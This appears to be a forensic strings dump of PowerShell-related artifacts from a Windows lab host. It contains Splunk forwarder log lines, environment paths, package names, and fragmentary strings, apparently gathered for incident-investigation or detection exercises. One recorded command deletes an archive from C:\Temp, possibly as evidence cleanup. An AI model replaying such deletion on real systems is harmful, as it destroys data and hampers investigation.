+08-30-2024 16:14:32.582 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:14:32.582 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:14:32.582 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:14:32.582 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+08-30-2024 16:14:32.698 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='8' with empty_msg='0'.
+08-30-2024 16:14:33.630 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' has stopped changing, will read it now.
+08-30-2024 16:14:33.638 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:14:33.638 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+ServerComponent_RSAT_Clustering_PowerShell
+RSAT-Clustering-PowerShell
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ws\system32\WindowsPowerShell\v1.0\Modules
+WINDOWS POWERSHELL
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Windows PowerShell ISE (x86).lnk
+@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-102
+Windows PowerShell ISE.lnk
+@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-101
+MICROSOFT-WINDOWS-ISCSITARGET-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+MICROSOFT-WINDOWS-ISCSITARGET-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+Microsoft-Windows-PowerShellWebAccess-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|!
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe
+# PowerShell tes
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Admin.evtx
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Admin.evtx
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Admin.evtx
+{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe
+dows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 16:19:46.436 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.141, eps=0.049, kb=8.614, ev=3, avg_age=39.667, max_age=40, interval_sec=60
+\Device\HarddiskVolume1\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Windows PowerShell ISE (x86).lnk
+@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-102
+Windows PowerShell ISE.lnk
+@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-101
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell.exe
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+WindowsPowerShell
+powershell_ise.exe
+WindowsPowerShell
+powershell_ise.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+08-30-2024 16:03:30.332 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.633, eps=0.148, kb=38.573, ev=9, avg_age=11.000, max_age=11, interval_sec=60
+08-30-2024 16:03:30.332 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.633, eps=0.148, kb=38.573, ev=9, avg_age=11.000, max_age=11, interval_sec=60
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+08-30-2024 16:08:00.221 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+08-30-2024 16:08:10.262 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:08:10.262 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:08:10.262 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-22-2023 11:13:24.592 -0700 INFO  WinEventLogInputProcessor [2072 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='14' with empty_msg='0'.
+@{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Taskbar_ReplaceCommandPromptWithPowerShellWinX/Description}
+@{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Taskbar_ReplaceCommandPromptWithPowerShellWinX/HighKeywords}
+@{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Developer_Mode_Setting_PowerShellExecution/Description}
+@{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Developer_Mode_Setting_PowerShellExecution/HighKeywords}
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\syste
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+POWERSHELLl
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+	source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx||WinEventLog:Windows PowerShell|
+08-30-2024 16:10:47.716 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='10' with empty_msg='0'.
+@{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/Settings_DeveloperMode_PowerShellSettingsGroup/Description}
+@{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/Settings_DeveloperMode_PowerShellSettingsGroup/HighKeywords}
+gramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+'PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell.exe
+powershell.exe
+system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+versalForwarder\etc/system/bin/powershell.cmd
+WINDOWS POWERSHELL
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+sourcetype::WinEventLog:Microsoft-Windows-PowerShell/Operational
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell.exe
+powershell.exe
+WindowsPowerShell
+WindowsPowerShell
+powershell2
+powershell
+powershell
+powershell2
+v4.0_Policy.1.0.Microsoft.PowerShell.Commands.Management__31bf3856ad364e35
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+sourcetype::WinEventLog:Microsoft-Windows-PowerShell/Operational
+sourcetype::WinEventLog:Windows PowerShell
+sourcetype::WinEventLog:Windows PowerShell
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-124
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell
+powershell
+source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command remove-item -path C:\Temp\1.zip
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+MICROSOFT-POWERSHELL-DSC-PULLSERVER-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+MICROSOFT-POWERSHELL-DSC-PULLSERVER-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+MICROSOFT-SHIELDED-VM-TOOLS-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx|host::Client2.BCS.local|WinEventLog:Windows PowerShell|
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-VM-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-WOW64-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Package_1438_for_KB4512578~31bf3856ad364e35~amd64~~10.0.1.5.cat|Package_1559_for_KB4512578~31bf3856ad364e35~amd64~~10.0.1.5.cat|
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+HYPERV-UX-POWERSHELL-MODULE-HYPERV-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+08-30-2024 16:10:47.230 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' has stopped changing, will read it now.
+08-30-2024 16:10:47.230 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:10:47.230 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:17:33.868 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:17:33.868 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:17:33.868 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:17:34.320 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
